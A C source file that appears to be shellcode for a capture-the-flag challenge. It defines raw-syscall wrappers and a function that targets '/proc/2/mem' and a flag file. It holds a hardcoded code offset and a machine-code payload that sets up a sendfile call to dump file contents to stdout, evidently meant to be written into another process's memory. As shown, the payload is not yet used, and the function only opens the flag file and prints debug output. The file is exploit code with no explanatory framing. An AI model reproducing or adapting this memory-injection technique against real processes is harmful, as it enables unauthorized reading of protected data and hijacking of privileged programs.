#define _GNU_SOURCE
#include <unistd.h>
#include <stdint.h>
#include <syscall.h>
#include <sys/stat.h>
#include <sched.h>
#include <fcntl.h>
#define __force_inline inline __attribute__((always_inline))

static long __force_inline sc_write(int fd, char *str, size_t len)
{
    long ret;

    asm volatile (
      "syscall"
      : "=a"(ret)
      : "a"(__NR_write), "D"(fd), "d"(len), "S" (str)
      : "rcx", "memory");
    
    return ret;
}

static long __force_inline sc_open(char *path, int flags, mode_t mode)
{
    long ret;

    asm volatile (
      "syscall"
      : "=a"(ret)
      : "a"(__NR_open), "D"(path), "d"(mode), "S" (flags)
      : "rcx", "memory");
    
    return ret;
}

static char __force_inline sc_char2hex(char val)
{
    if (val < 10)
        return val + '0';
    else
        return val - 10 + 'a';
}

static long __force_inline sc_write_hex(int fd, unsigned long val)
{
    char buf[16];
    int i;

    for (i = 0; i < 16; i++) {
        buf[i] = sc_char2hex((val >> (60 - i*4)) & 0xf);
    }

    return sc_write(fd, buf, 16);
}

void sc() {
    char mem_str[] = "/proc/2/mem";
    char ctf[] = "/home/user/flag";
    int64_t offset = 0x401b9d;
    char payload[] = {0x48,0x89,0xfe,0x48,0xc7,0xc0,0x28,0x00,0x00,0x00,0x48,0xc7,0xc7,0x01,0x00,0x00,0x00,0x48,0xc7,0xc2,0x00,0x00,0x00,0x00,0x49,0xc7,0xc2,0x12,0x00,0x00,0x00,0x0f,0x05};
    unsigned long ret = 9;

    

    ret = sc_open(ctf, O_RDWR, 0);
    sc_write_hex(1, ret);
    ret = sc_write(1, mem_str, sizeof(mem_str));
    sc_write_hex(1, ret);
    
   return;
}
